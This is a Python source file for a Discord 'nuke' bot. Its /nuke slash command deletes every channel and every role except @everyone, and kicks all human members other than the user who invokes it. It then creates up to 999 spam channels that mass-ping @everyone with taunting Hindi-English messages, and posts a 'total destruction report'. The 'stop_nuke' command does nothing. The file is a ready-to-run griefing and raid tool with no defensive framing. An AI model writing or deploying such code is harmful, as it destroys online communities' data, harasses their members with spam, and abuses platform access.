import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("✅ Commands synced!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

# ULTIMATE NUKE - Nuclear option!
@bot.tree.command(name="nuke", description="🌋 COMPLETE SERVER DESTRUCTION 🌋")
@discord.app_commands.checks.has_permissions(administrator=True)
async def nuke(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    try:
        # Step 1: Delete ALL channels first
        print("🔥 PHASE 1: DELETING ALL CHANNELS...")
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"💥 DESTROYED: {channel.name}")
            except Exception as e:
                print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Step 2: Delete ALL roles except @everyone
        print("🔥 PHASE 2: DELETING ALL ROLES...")
        for role in list(guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"💥 DESTROYED ROLE: {role.name}")
                except Exception as e:
                    print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Step 3: Kick all members except bot owner
        print("🔥 PHASE 3: KICKING ALL MEMBERS...")
        for member in list(guild.members):
            if member.id != interaction.user.id and not member.bot:
                try:
                    await member.kick(reason="SERVER NUKED 💥")
                    print(f"👢 KICKED: {member.name}")
                except Exception as e:
                    print(f"⚠️ Could not kick {member.name}: {e}")
            await asyncio.sleep(0.1)
        
        # Step 4: Create 999+ spam channels with gop gop messages
        print("🔥 PHASE 4: CREATING CHAOS CHANNELS...")
        spam_messages = [
            "🚀 APKA SERVER KI GOP GOP HOGYI! 💥",
            "⚡ SERVER COMPLETELY NUKED! ⚡",
            "🎆 DESTRUCTION COMPLETE! 🎆",
            "@everyone Your server has been obliterated! 💣",
            "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
            "🔥 TOTAL ANNIHILATION! 🔥",
            "💥 APKA SERVER KA KOI BACHA HI NAHI BACHA! 💥",
        ]
        
        for i in range(999):
            try:
                # Create channel with gop gop name
                channel_name = f"gop-gop-{i+1}-💣"
                channel = await guild.create_text_channel(channel_name)
                
                # Send spam message
                message = spam_messages[i % len(spam_messages)]
                await channel.send(message)
                await channel.send(f"@everyone {message}")
                
                print(f"💥 Created channel {i+1}: {channel_name}")
                
                # Rate limit protection
                if i % 10 == 0:
                    await asyncio.sleep(1)
                else:
                    await asyncio.sleep(0.2)
                    
            except discord.Forbidden:
                print(f"⚠️ Cannot create more channels (Discord limit reached)")
                break
            except Exception as e:
                print(f"⚠️ Error at channel {i+1}: {e}")
                break
        
        # Final message
        try:
            general = await guild.create_text_channel("0-final-message")
            await general.send("""
🚀🚀🚀 **APKA SERVER KI COMPLETE GOP GOP HO GAYEE!** 🚀🚀🚀

╔═══════════════════════════════════════╗
║  💥 TOTAL DESTRUCTION REPORT 💥      ║
╠═══════════════════════════════════════╣
║ ✅ All Channels: DELETED              ║
║ ✅ All Roles: DELETED                 ║
║ ✅ All Members: KICKED                ║
║ ✅ 999+ Chaos Channels: CREATED       ║
║ ✅ Gop Gop Messages: SPAMMED          ║
╚═══════════════════════════════════════╝

**SERVER STATUS: 💀 DEAD 💀**

Ye thi aapki server ki kahaani! 🎬
""")
        except:
            pass
        
        await interaction.followup.send("✅ **NUKE COMPLETE!** Server fully destroyed! 💥🔥")
        print("✅ NUKE OPERATION SUCCESSFUL!")
        
    except discord.Forbidden:
        await interaction.followup.send("❌ Bot doesn't have admin permissions!")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Emergency stop command
@bot.tree.command(name="stop_nuke", description="Stop the nuke operation")
@discord.app_commands.checks.has_permissions(administrator=True)
async def stop_nuke(interaction: discord.Interaction):
    await interaction.response.defer()
    await interaction.followup.send("🛑 Nuke operation would be stopped (run this before execution)")

# Run bot
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN not found! Add it to .env file")
